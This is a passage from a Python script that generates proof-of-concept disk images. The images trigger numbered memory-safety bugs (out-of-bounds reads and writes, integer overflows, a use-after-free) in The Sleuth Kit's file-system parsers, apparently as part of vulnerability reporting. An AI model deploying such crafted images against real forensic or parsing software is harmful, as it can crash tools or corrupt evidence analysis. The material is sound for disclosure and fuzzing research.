    ext_tree_node = make_btrfs_leaf(EXT_TREE_ADDR, BTRFS_OBJID_EXTENT_TREE, [])

    # ── Superblock ──
    sb = make_btrfs_superblock(
        chunk_tree_root=CHUNK_TREE_ADDR,
        root_tree_root=ROOT_TREE_ADDR,
        total_bytes=IMG_SIZE,
        sys_chunk_array_bytes=sys_chunks,
        dev_total_bytes=IMG_SIZE,
    )

    img[0x10000:0x10000 + len(sb)] = sb
    img[CHUNK_TREE_ADDR:CHUNK_TREE_ADDR + NODE_SIZE] = chunk_tree_node
    img[ROOT_TREE_ADDR:ROOT_TREE_ADDR + NODE_SIZE]   = root_tree_node
    img[FS_TREE_ADDR:FS_TREE_ADDR + NODE_SIZE]       = fs_tree_node
    img[EXT_TREE_ADDR:EXT_TREE_ADDR + NODE_SIZE]     = ext_tree_node

    with open(path, 'wb') as f:
        f.write(bytes(img))
    print(f'  [+] {path} ({len(img)} bytes)')


def gen_ffs_cgiusedoff_oob(path):
    """Issue 10: FFS cg_iusedoff=-1 signed comparison bypass."""
    IMG_SIZE = 512 * 1024  # 512 KB (need >262144+1536 for UFS2 reads to succeed)
    img = bytearray(IMG_SIZE)

    # UFS1 parameters:
    bsize_b = 8192   # block size (ffsbsize_b)
    fsize_b = 1024   # fragment size (fs->block_size)
    bsize_frag = 8   # frags per block
    cg_num = 1
    cg_inode_num = 64
    cg_frag_num = 256
    # gd_off = 16 frags → cgtod(0) = 0 + 16 = 16 frags → byte 16*1024=16384
    gd_off = 16
    ino_off = 24     # inode table at frag 24 → byte 24*1024=24576
    dat_off = 32

    sb = make_ffs_sb1(
        bsize_b=bsize_b, fsize_b=fsize_b, bsize_frag=bsize_frag,
        cg_num=cg_num, cg_inode_num=cg_inode_num, cg_frag_num=cg_frag_num,
        sb_off=16, gd_off=gd_off, ino_off=ino_off, dat_off=dat_off,
        fs_inopb=bsize_b // 128  # 64 inodes per block
    )

    # Cylinder group at byte gd_off * fsize_b = 16 * 1024 = 16384
    # cg_iusedoff = -1 (0xFFFFFFFF) → bypass signed check!
    cg = make_ffs_cgd(cg_iusedoff=-1, cg_freeoff=0)

    img[UFS1_SBOFF:UFS1_SBOFF + len(sb)] = sb
    cg_offset = gd_off * fsize_b  # 16384
    img[cg_offset:cg_offset + len(cg)] = cg

    # Put some data at inode table offset (so the read succeeds)
    ino_offset = ino_off * fsize_b  # 24576
    if ino_offset + bsize_b <= IMG_SIZE:
        img[ino_offset:ino_offset + bsize_b] = b'\x00' * bsize_b

    with open(path, 'wb') as f:
        f.write(bytes(img))
    print(f'  [+] {path} ({len(img)} bytes)')


def gen_ffs_itoo_oob(path):
    """Issue 11: FFS itoo_lcl OOB via anomalous fs_inopb."""
    IMG_SIZE = 512 * 1024  # need >262144+1536 for UFS2 reads
    img = bytearray(IMG_SIZE)

    # With bsize_b=1024 and fs_inopb=64 (normal=8):
    # itoo(inum=8) = 8 % 64 = 8 → offs=8*128=1024=bsize_b → OOB!
    bsize_b = 1024
    fsize_b = 512
    bsize_frag = bsize_b // fsize_b  # = 2
    cg_num = 1
    cg_inode_num = 128  # enough inodes
    cg_frag_num = 512
    gd_off = 4   # frags → cgtod=4 frags → byte 4*512=2048
    ino_off = 8  # inode table at frag 8 → byte 8*512=4096
    dat_off = 16

    sb = make_ffs_sb1(
        bsize_b=bsize_b, fsize_b=fsize_b, bsize_frag=bsize_frag,
        cg_num=cg_num, cg_inode_num=cg_inode_num, cg_frag_num=cg_frag_num,
        sb_off=4, gd_off=gd_off, ino_off=ino_off, dat_off=dat_off,
        fs_inopb=64,  # ANOMALOUS! normal would be 8
        fs_fragshift=9  # log2(512)
    )

    # Cylinder group at byte gd_off * fsize_b = 4*512=2048
    cg = make_ffs_cgd(cg_iusedoff=16, cg_freeoff=32)  # valid offsets

    # Inode table at ino_off * fsize_b = 4096
    # No special data needed - the OOB happens at itoo=8 which is at offset 1024 = bsize_b

    img[UFS1_SBOFF:UFS1_SBOFF + len(sb)] = sb
    cg_offset = gd_off * fsize_b  # 2048
    img[cg_offset:cg_offset + len(cg)] = cg

    with open(path, 'wb') as f:
        f.write(bytes(img))
    print(f'  [+] {path} ({len(img)} bytes)')


def gen_ntfs_idxrec_oob(path):
    """Issue 13: NTFS ntfs_fix_idxrec upd_seq OOB via crafted INDX record.
    Use mkfs.ntfs then patch the INDX record.
    """
    IMG_SIZE = 4 * 1024 * 1024
    tmp = path + '.tmp'
    try:
        # Create minimal NTFS image
        with open(tmp, 'wb') as f:
            f.write(b'\x00' * IMG_SIZE)
        ret = subprocess.run(
            ['mkfs.ntfs', '-C', '-q', '-F', '-s', '4096', tmp],
            capture_output=True, timeout=30)
        if ret.returncode != 0:
            # Fallback: build from scratch
            _gen_ntfs_idxrec_scratch(path)
            return

        # Read the image and find the INDX record to patch
        with open(tmp, 'rb') as f:
            img = bytearray(f.read())

        # Search for INDX magic in the image
        indx_magic = b'INDX'
        patched = False
        offset = 0
        while True:
            pos = img.find(indx_magic, offset)
            if pos == -1:
                break
            # Patch the INDX record:
            # upd_off at byte 4 (uint16_t), upd_cnt at byte 6 (uint16_t)
            # Set upd_off = 4092 (= 4096 - 4) and upd_cnt = 3
            # Existing check: sizeof(ntfs_upd)=4 > len-upd_off = 4 → fail if upd_off=4092
            # Actually: check is upd_off > len (false: 4092 > 4096 is false)
            # and sizeof(ntfs_upd)=4 > len-upd_off: 4 > 4 → false → passes!
            # Then loop reads upd_seq + 2 past end
            if pos + 4096 <= len(img):
                # Set upd_off=4092 so full ntfs_upd (4 bytes) fits but upd_seq[1] doesn't
                struct.pack_into('<H', img, pos + 4, 4092)  # upd_off
                struct.pack_into('<H', img, pos + 6, 3)     # upd_cnt = 3
                # Set upd_val at upd_off (pos+4092): set it to match sector-end bytes
                # so that at i=1 the seq MATCHES (doesn't trigger mismatch there)
                # and at i=2 it tries to read upd_seq+2 which is at pos+4096 → OOB!
                # Set upd_val = bytes at sector-end (pos+510)
                upd_val = struct.unpack_from('<H', img, pos + 510)[0]
                struct.pack_into('<H', img, pos + 4092, upd_val)  # upd_val
                # upd_seq[0] (for i=1): place at upd_off+2 = pos+4094
                # set it to match so i=1 passes, then i=2 reads pos+4096 → OOB
                struct.pack_into('<H', img, pos + 4094, 0xABCD)  # upd_seq[0]
                # sector byte at pos+510: must match upd_val
                struct.pack_into('<H', img, pos + 510, upd_val)
                # sector byte at pos+1022: must NOT match (so OOB read path taken)
                cur_sec2 = struct.unpack_from('<H', img, pos + 1022)[0]
                struct.pack_into('<H', img, pos + 1022, upd_val + 1)  # mismatch!
                patched = True
                break
            offset = pos + 1

        if not patched:
            _gen_ntfs_idxrec_scratch(path)
            return

        with open(path, 'wb') as f:
            f.write(bytes(img))
        print(f'  [+] {path} ({len(img)} bytes)')

    except Exception as e:
        print(f'  [!] mkfs.ntfs failed ({e}), using scratch')
        _gen_ntfs_idxrec_scratch(path)
    finally:
        if os.path.exists(tmp):
            os.unlink(tmp)


def _gen_ntfs_idxrec_scratch(path):
    """Fallback: build a minimal NTFS image with crafted INDX record."""
    # NTFS boot sector
    IMG_SIZE = 4 * 1024 * 1024
    img = bytearray(IMG_SIZE)
    CLUSTER_SIZE = 4096
    CLUSTER_COUNT = IMG_SIZE // CLUSTER_SIZE

    # NTFS boot sector at byte 0
    boot = bytearray(512)
    boot[0:3] = b'\xEB\x52\x90'  # jmp + nop
    boot[3:11] = b'NTFS    '     # OEM ID
    struct.pack_into('<H', boot, 11, 512)    # bytes per sector
    boot[13] = 8                             # sectors per cluster (= 4096)
    struct.pack_into('<H', boot, 14, 0)      # reserved sectors
    # Lots of zeros for minimal boot sector
    struct.pack_into('<Q', boot, 40, CLUSTER_COUNT)   # total sectors (approx)
    struct.pack_into('<Q', boot, 48, 4)               # $MFT cluster (at cluster 4)
    struct.pack_into('<Q', boot, 56, 2)               # $MFTMirr cluster
    boot[64] = 0xF6                                   # clusters per MFT record
    boot[65:68] = b'\x00\x00\x00'
    boot[68] = 4                                      # clusters per index record
    img[0:512] = boot

    # Place a crafted INDX record at a known location (e.g., cluster 8)
    indx_offset = 8 * CLUSTER_SIZE
    indx = _make_crafted_indx()
    img[indx_offset:indx_offset + len(indx)] = indx

    with open(path, 'wb') as f:
        f.write(bytes(img))
    print(f'  [+] {path} ({len(img)} bytes) [scratch]')


def _make_crafted_indx():
    """Build a 4096-byte INDX record that triggers the upd_seq OOB."""
    rec = bytearray(4096)
    rec[0:4] = b'INDX'          # magic
    struct.pack_into('<H', rec, 4, 4092)  # upd_off = 4092 (near end)
    struct.pack_into('<H', rec, 6, 3)     # upd_cnt = 3 → loop i=1,2
    struct.pack_into('<I', rec, 8, 1)     # log_file_seq_num
    struct.pack_into('<Q', rec, 16, 0)    # vcn

    # INDX node header @ 24
    struct.pack_into('<I', rec, 24, 40)   # index_block_start
    struct.pack_into('<I', rec, 28, 0)    # index_block_end
    struct.pack_into('<I', rec, 32, 40)   # index_alloc_end
    struct.pack_into('<I', rec, 36, 0)    # flags

    # upd_val at upd_off=4092: set to some value
    upd_val = 0xBEEF
    struct.pack_into('<H', rec, 4092, upd_val)

    # upd_seq[0] at 4094: NOT the upd_val (so i=1 gets mismatch → OOB branch)
    # Actually bug: mismatch at i=2 reads &upd_seq + 2 = 4092+2+2=4096 → OOB
    # So let i=1 PASS (match) and i=2 fail (mismatch at upd_seq+2 which is OOB)
    #
    # For i=1: check sector[510..511] == upd_val
    # For i=2: check sector[1022..1023] == upd_val → if mismatch, read upd_seq[1] at 4094+2=4096 OOB
    struct.pack_into('<H', rec, 510, upd_val)   # sector 0 end = upd_val (match at i=1 → NO mismatch)
    # Wait: mismatch is what triggers the OOB read path!
    # If match: *old_val++ = *new_val++ → write path (also OOB but different)
    # If mismatch at i=1: reads upd_seq[0] at 4094 → within bounds (1 byte OOB)
    # If mismatch at i=2: reads upd_seq[1] at 4096 → 1 byte OOB → ASAN catch
    struct.pack_into('<H', rec, 510, upd_val)         # sector 0 end matches → i=1 no mismatch
    struct.pack_into('<H', rec, 1022, upd_val ^ 0xFF) # sector 1 end MISMATCHES → i=2 mismatch
    # i=2 mismatch: reads tsk_getu16(&upd->upd_seq + (2-1)*2) = &upd_seq + 2 = rec[4094] + 2 = rec[4096] → OOB!

    return bytes(rec)


def gen_xfs_agno_overflow(path):
    """Issue 14: XFS sb_agblocks*sb_blocksize uint32_t overflow."""
    IMG_SIZE = 8 * 1024 * 1024
    tmp = path + '.tmp'
    try:
        with open(tmp, 'wb') as f:
            f.write(b'\x00' * IMG_SIZE)
        ret = subprocess.run(
            ['mkfs.xfs', '-f', '-b', 'size=4096', '-d', f'size={IMG_SIZE}', tmp],
            capture_output=True, timeout=30)
        if ret.returncode != 0:
            _gen_xfs_scratch(path, IMG_SIZE)
            return

        with open(tmp, 'rb') as f:
            img = bytearray(f.read())

        # XFS superblock at byte 0, sb_agblocks at offset 0x44 (uint32_t BE)
        # and sb_blocksize at offset 0x04 (uint32_t BE)
        # Set sb_agblocks=1048576 and sb_blocksize=4096 → overflow to 0
        # Current sb_blocksize should already be 4096
        cur_bsize = struct.unpack_from('>I', img, 0x04)[0]
        print(f'  XFS sb_blocksize={cur_bsize}')
        struct.pack_into('>I', img, 0x44, 1048576)  # sb_agblocks = 1048576 (overflow trigger)

        # Must update XFS superblock CRC (sb uses CRC-32C at offset 0x1fc, only in v5)
        # Check if this is v5 (has CRC): superblock version in sb_versionnum
        sb_ver = struct.unpack_from('>H', img, 0x6A)[0] & 0xF
        if sb_ver == 5:
            # v5 XFS uses CRC-32C at offset 0x1FC (4 bytes)
            # Compute CRC of bytes [0..0x1FB] with CRC field=0
            struct.pack_into('>I', img, 0x1FC, 0)
            crc = crc32c(bytes(img[:0x200]))  # CRC of first 512 bytes
            struct.pack_into('>I', img, 0x1FC, crc)

        with open(path, 'wb') as f:
            f.write(bytes(img))
        print(f'  [+] {path} ({len(img)} bytes)')

    except Exception as e:
        print(f'  [!] mkfs.xfs failed ({e}), using scratch')
        _gen_xfs_scratch(path, IMG_SIZE)
    finally:
        if os.path.exists(tmp):
            os.unlink(tmp)


def _gen_xfs_scratch(path, img_size):
    """Minimal XFS superblock with overflowing agblocks."""
    img = bytearray(img_size)
    sb = bytearray(512)

    # XFS superblock (big-endian)
    struct.pack_into('>I', sb, 0x00, XFS_SUPER_MAGIC)  # sb_magicnum
    struct.pack_into('>I', sb, 0x04, 4096)              # sb_blocksize
    struct.pack_into('>Q', sb, 0x08, img_size // 4096)  # sb_dblocks
    struct.pack_into('>Q', sb, 0x10, 0)                  # sb_rblocks
    struct.pack_into('>Q', sb, 0x18, 0)                  # sb_rextents
    # uuid @ 0x20: zeros
    struct.pack_into('>Q', sb, 0x30, 16)                 # sb_logstart
    struct.pack_into('>Q', sb, 0x38, 2)                  # sb_rootino
    struct.pack_into('>Q', sb, 0x40, 1)                  # sb_rbmino
    struct.pack_into('>I', sb, 0x48, 1)                  # sb_agcount = 1
    struct.pack_into('>I', sb, 0x44, 1048576)            # sb_agblocks = 1048576 → overflow!
    struct.pack_into('>I', sb, 0x4C, 0)                  # sb_rbmblocks
    struct.pack_into('>I', sb, 0x50, 0)                  # sb_logblocks
    struct.pack_into('>H', sb, 0x54, 0xB4A5)             # sb_versionnum (v4)
    struct.pack_into('>H', sb, 0x56, 512)                # sb_sectsize
    struct.pack_into('>H', sb, 0x58, 4096)               # sb_inodesize
    struct.pack_into('>H', sb, 0x5A, 4096 // 512)        # sb_inopblock = 8
    # sb_fname @ 0x5C: zeros
    sb[0x6C] = 12   # sb_blocklog = log2(4096) = 12
    sb[0x6D] = 9    # sb_sectlog = log2(512) = 9
    sb[0x6E] = 12   # sb_inodelog = log2(4096)
    sb[0x6F] = 3    # sb_inopblog = log2(8)
    sb[0x70] = 20   # sb_agblklog = log2(1048576) = 20
    sb[0x71] = 0    # sb_rextslog
    sb[0x72] = 1    # sb_inprogress
    sb[0x73] = 4    # sb_imax_pct
    struct.pack_into('>H', sb, 0x6A, 4)                  # version (v4 = 4)

    img[0:512] = sb
    with open(path, 'wb') as f:
        f.write(bytes(img))
    print(f'  [+] {path} ({len(img)} bytes) [scratch]')


def gen_yaffs_uaf(path):
    """Issue 15: YAFFS2 minimal image (triggers UAF in yaffs2_open).

    Requirements for yaffs_initialize_spare_format to succeed:
    - seq_num >= YAFFS_LOWEST_SEQUENCE_NUMBER = 0x1000
    - At least 10 non-erased chunks in a block (for auto-detection)
    - Chunks 1..9 must have DIFFERENT obj_ids so that spare offset 4 (obj_id position)
      is NOT consistent → eliminates false offset matches in auto-detection

    The UAF: yaffs2_open allocates YAFFSFS_INFO via unique_ptr, takes raw fs ptr,
    never calls release(). unique_ptr destructor frees on return, caller uses freed ptr.
    """
    CHUNKS_PER_BLOCK = 64
    SEQ_NUM = 0x00001000  # >= YAFFS_LOWEST_SEQUENCE_NUMBER = 0x1000
    YAFFS_TYPE_DIRECTORY = 3
    CHUNKS_WITH_DATA = 10  # need >= minChunksRead=10 for auto-detection

    def make_spare(seq_num, obj_id, chunk_id, n_bytes=0):
        spare = bytearray(YAFFS2_SPARE_SIZE)
        struct.pack_into('<I', spare, 0, seq_num)   # seq at offset 0
        struct.pack_into('<I', spare, 4, obj_id)    # obj_id at offset 4
        struct.pack_into('<I', spare, 8, chunk_id)  # chunk_id at offset 8
        struct.pack_into('<I', spare, 12, n_bytes)  # n_bytes at offset 12
        return bytes(spare)

    def make_obj_header(obj_type, parent_id, name=b''):
        data = bytearray(YAFFS2_CHUNK_SIZE)
        struct.pack_into('<I', data, 0, obj_type)
        struct.pack_into('<I', data, 4, parent_id)
        data[0xA:0xA+len(name)] = name[:255]
        return bytes(data)

    pages = []

    # Chunk 0: root directory header (obj_id=1, chunk_id=0)
    root_hdr = make_obj_header(YAFFS_TYPE_DIRECTORY, parent_id=1, name=b'')
    pages.append(root_hdr + make_spare(SEQ_NUM, 1, 0, YAFFS2_CHUNK_SIZE))

    # Chunks 1-9: data chunks with DIFFERENT obj_ids per chunk
    # This ensures spare offset 4 (obj_id) varies across chunks →
    # eliminates false positive spare format detection at offset 4
    for i in range(1, CHUNKS_WITH_DATA):
        data = b'\x00' * YAFFS2_CHUNK_SIZE
        pages.append(data + make_spare(SEQ_NUM, i + 1, 0, YAFFS2_CHUNK_SIZE))

    # Remaining chunks: erased (0xFF)
    for i in range(CHUNKS_WITH_DATA, CHUNKS_PER_BLOCK):
        pages.append(b'\xff' * YAFFS2_PAGE_SIZE)

    img = b''.join(pages)
    with open(path, 'wb') as f:
        f.write(img)
    print(f'  [+] {path} ({len(img)} bytes)')


def gen_apfs_btree_keycount_oob(path):
    """Issue 01: APFS omap btree root with key_count=0xFFFF (MSan trigger).

    Block layout (PHYSICAL objects: OID = block_num for PHYSICAL objects):
    Block 0: NX superblock (oid=1), omap_oid=2 → reads omap from block 2
    Block 2: Container omap (oid=2), tree_oid=3 → reads btree from block 3
    Block 3: Omap btree root (oid=3, subtype=OMAP, key_count=0xFFFF) ← BUG
    """
    IMG_SIZE = 8 * 1024 * 1024
    img = bytearray(IMG_SIZE)

    OMAP_OID = 2   # omap at physical block 2
    BTREE_OID = 3  # btree at physical block 3

    # NX Superblock at block 0
    nx_sb = make_apfs_nx_superblock(
        block_size=APFS_BLOCK_SIZE,
        block_count=IMG_SIZE // APFS_BLOCK_SIZE,
        omap_oid=OMAP_OID,  # pool reads omap from block OMAP_OID
        chkpt_desc_base=4, chkpt_desc_count=1,
        chkpt_data_base=5, chkpt_data_count=1,
        spaceman_oid=6, reaper_oid=7
    )

    # Omap at block OMAP_OID=2 (OID=2, read from offset 2*4096)
    omap_block = make_apfs_omap(oid=OMAP_OID, xid=1, tree_oid=BTREE_OID)

    # Btree root at block BTREE_OID=3 with key_count=0xFFFF and subtype=OMAP
    btree_block = make_apfs_btree_node(
        oid=BTREE_OID, xid=1, key_count=0xFFFF,
        flags=APFS_BTNODE_ROOT | APFS_BTNODE_LEAF | APFS_BTNODE_FIXED_KV_SIZE,
        subtype=0x000B  # APFS_OBJ_TYPE_OMAP required by APFSObjectBtreeNode
    )

    img[0:APFS_BLOCK_SIZE] = nx_sb
    img[OMAP_OID*APFS_BLOCK_SIZE:(OMAP_OID+1)*APFS_BLOCK_SIZE] = omap_block
    img[BTREE_OID*APFS_BLOCK_SIZE:(BTREE_OID+1)*APFS_BLOCK_SIZE] = btree_block

    with open(path, 'wb') as f:
        f.write(bytes(img))
    print(f'  [+] {path} ({len(img)} bytes)')


def gen_apfs_minimal_valid(path):
    """Issue 02: APFS minimal valid image triggering getImageInfo uninit alloc.
    Same block layout as issue 01 but key_count=0 (no volumes).
    Pool opens successfully → getImageInfo is called → num_img from uninitialized malloc.
    Note: With standalone binary (fresh heap), num_img=0 and no crash. In libFuzzer
    mode with many iterations, num_img gets garbage (0xf5... ASAN fill) → crash.
    """
    IMG_SIZE = 4 * 1024 * 1024
    img = bytearray(IMG_SIZE)

    OMAP_OID = 2
    BTREE_OID = 3

    nx_sb = make_apfs_nx_superblock(
        block_size=APFS_BLOCK_SIZE,
        block_count=IMG_SIZE // APFS_BLOCK_SIZE,
        omap_oid=OMAP_OID,
        chkpt_desc_base=4, chkpt_desc_count=1,
        chkpt_data_base=5, chkpt_data_count=1,
        spaceman_oid=6, reaper_oid=7
    )

    omap_block = make_apfs_omap(oid=OMAP_OID, xid=1, tree_oid=BTREE_OID)
    btree_block = make_apfs_btree_node(oid=BTREE_OID, xid=1, key_count=0,
                                        flags=APFS_BTNODE_ROOT | APFS_BTNODE_LEAF,
                                        subtype=0x000B)  # OMAP subtype required

    img[0:APFS_BLOCK_SIZE] = nx_sb
    img[OMAP_OID*APFS_BLOCK_SIZE:(OMAP_OID+1)*APFS_BLOCK_SIZE] = omap_block
    img[BTREE_OID*APFS_BLOCK_SIZE:(BTREE_OID+1)*APFS_BLOCK_SIZE] = btree_block

    with open(path, 'wb') as f:
        f.write(bytes(img))
    print(f'  [+] {path} ({len(img)} bytes)')


def gen_hfsplus_decmpfs_overflow(path, uncSize=0xFFFFFFFFFFFFFF00):
    """Issue 07: HFS+ decmpfs uncSize integer overflow."""
    # We need an HFS+ image with a file that has a com.apple.decmpfs xattr
    # with uncSize = near UINT64_MAX so uncSize+100 overflows.
    # A minimal HFS+ image is complex; produce a simplified raw image.
    IMG_SIZE = 4 * 1024 * 1024
    BLOCK_SIZE = 4096
    img = bytearray(IMG_SIZE)

    # HFS+ alternate boot block @ 0: zeros
    # Volume header @ 1024 (sector 2)
    vh = make_hfsplus_vh(total_blocks=IMG_SIZE // BLOCK_SIZE, block_size=BLOCK_SIZE)
    img[HFSPLUS_VOLHDR_OFFSET:HFSPLUS_VOLHDR_OFFSET + len(vh)] = vh

    # For a realistic trigger we'd need a full HFS+ catalog/attrs tree.
    # The decmpfs attribute is read during icat/fls when opening a compressed file.
    # This requires a more complete HFS+ image. Build from mkfs if available.
    _build_hfsplus_with_decmpfs(path, uncSize, compression_type=3)


def _build_hfsplus_with_decmpfs(path, uncSize, compression_type):
    """Try to build HFS+ image using hformat/mkfs tools, else write minimal."""
    IMG_SIZE = 4 * 1024 * 1024
    img = bytearray(IMG_SIZE)

    # Without a real HFS+ mkfs tool, write the minimum structure needed:
    # The fls_hfs_fuzzer will try tsk_fs_open_img with TSK_FS_TYPE_HFS_DETECT.
    # TSK's HFS+ parser checks for H+ magic at sector 2.
    BLOCK_SIZE = 4096

    # Volume header at byte 1024 ('H+' = 0x482B)
    vh = bytearray(512)
    struct.pack_into('>H', vh, 0, 0x482B)   # signature H+
    struct.pack_into('>H', vh, 2, 4)        # version
    struct.pack_into('>I', vh, 4, 0x100)    # attributes (cleanly unmounted)
    struct.pack_into('>I', vh, 28, 1)       # checkDate (non-zero)
    struct.pack_into('>I', vh, 40, BLOCK_SIZE)           # blockSize
    struct.pack_into('>I', vh, 44, IMG_SIZE // BLOCK_SIZE)  # totalBlocks
    struct.pack_into('>I', vh, 48, IMG_SIZE // BLOCK_SIZE // 2)  # freeBlocks
    struct.pack_into('>I', vh, 68, 1)       # writeCount

    img[1024:1024+len(vh)] = vh

    with open(path, 'wb') as f:
        f.write(bytes(img))
    print(f'  [+] {path} ({len(img)} bytes) [minimal HFS+ header]')
    print(f'      NOTE: Full decmpfs trigger needs HFS+ catalog; see bug report for manual steps')


def gen_decmpfs_noncompressed_oob(path, primary=True):
    """Issues 08/12: HFS+ decmpfs noncompressed OOB read."""
    IMG_SIZE = 4 * 1024 * 1024
    img = bytearray(IMG_SIZE)

    BLOCK_SIZE = 4096
    vh = bytearray(512)
    struct.pack_into('>H', vh, 0, 0x482B)
    struct.pack_into('>H', vh, 2, 4)
    struct.pack_into('>I', vh, 4, 0x100)
    struct.pack_into('>I', vh, 40, BLOCK_SIZE)
    struct.pack_into('>I', vh, 44, IMG_SIZE // BLOCK_SIZE)
    struct.pack_into('>I', vh, 48, IMG_SIZE // BLOCK_SIZE // 2)
    struct.pack_into('>I', vh, 68, 1)

    img[1024:1024+len(vh)] = vh

    with open(path, 'wb') as f:
        f.write(bytes(img))
    name = 'primary' if primary else 'secondary'
    print(f'  [+] {path} ({len(img)} bytes) [minimal HFS+ header, {name}]')
    print(f'      NOTE: Full decmpfs trigger needs HFS+ catalog; see bug report for manual steps')


# ═══════════════════════════════════════════════════════════════════════════
# Main
# ═══════════════════════════════════════════════════════════════════════════

BASE = os.path.dirname(os.path.abspath(__file__))

POCS = [
    # (subfolder, filename, generator_func, *args)
    ('01-apfs-btree-keycount-oob',
     'apfs_btree_huge_key_count.img',
     gen_apfs_btree_keycount_oob),

    ('02-apfs-getimageinfo-uninit-alloc',
     'apfs_minimal_valid.img',
     gen_apfs_minimal_valid),

    ('03-btrfs-sf01-zero-items',
     'btrfs_sf01_zero_items.img',
     lambda p: gen_btrfs_zero_items(p, nritems_value=0)),

    ('04-btrfs-sf06-stripe-oob',
     'btrfs_sf06_stripe_oob.img',
     gen_btrfs_stripe_oob),

    ('05-btrfs-sf07-large-num-items',
     'btrfs_sf07_large_num_items.img',
     lambda p: gen_btrfs_zero_items(p, nritems_value=0x10000000)),

    ('06-btrfs-sf09-dir-entry-oob',
     'btrfs_sf09_dir_entry_oob_v2.img',
     gen_btrfs_dir_entry_oob),

    ('07-decmpfs-uncsize-overflow',
     'decmpfs_sf02_uncsize_overflow.img',
     lambda p: gen_hfsplus_decmpfs_overflow(p, uncSize=0xFFFFFFFFFFFFFF00)),

    ('08-12-decmpfs-noncompressed-oob',
     'decmpfs_sf07_noncompressed_oob.img',
     lambda p: gen_decmpfs_noncompressed_oob(p, primary=True)),

    ('08-12-decmpfs-noncompressed-oob',
     'hfs_decmpfs_oob_read.img',
     lambda p: gen_decmpfs_noncompressed_oob(p, primary=False)),

    ('10-ffs-cgiusedoff-oob',
     'ffs_cgiusedoff_oob_read.img',
     gen_ffs_cgiusedoff_oob),

    ('11-ffs-itoo-oob',
     'ffs_itoo_oob_write.img',
     gen_ffs_itoo_oob),

    ('13-ntfs-idxrec-oob',
     'ntfs_idxrec_oob.img',
     gen_ntfs_idxrec_oob),

    ('14-xfs-uint32-overflow',
     'xfs_agno_overflow.img',
     gen_xfs_agno_overflow),

    ('15-yaffs2-uaf',
     'yaffs_uaf_minimal.img',
     gen_yaffs_uaf),
]

if __name__ == '__main__':
    print('[*] Generating sleuthkit PoC images...\n')
    for (subfolder, filename, gen_func) in POCS:
        out_dir = os.path.join(BASE, subfolder)
        os.makedirs(out_dir, exist_ok=True)
        out_path = os.path.join(out_dir, filename)
        print(f'[>] {subfolder}/{filename}')
        try:
            gen_func(out_path)
        except Exception as e:
            print(f'  [!] FAILED: {e}')
            import traceback
            traceback.print_exc()

    print('\n[*] Done.')
